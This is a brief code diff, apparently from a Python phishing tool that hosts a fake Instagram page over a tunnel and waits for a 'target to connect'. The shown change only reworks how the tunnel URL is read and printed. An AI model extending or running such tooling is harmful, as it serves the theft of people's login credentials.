@@ -20,6 +20,7 @@ if os.name == "nt":
             pass
         else:
             exit(Fore.GREEN + "\nhave a good day".title())
+
 #For linux====================================================================================================
 else:
     try:
@@ -153,9 +154,10 @@ def instagram():
 
 
 #====================================================================================================
-    file = open("localhost.txt" , "r")
-    print(file.readline(22))
-    
+    line = linecache.getline(r"localhost.txt" , 24)
+    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , ").lstrip())
+    linecache.clearcache()
+
     Sprint(Fore.YELLOW + "waiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
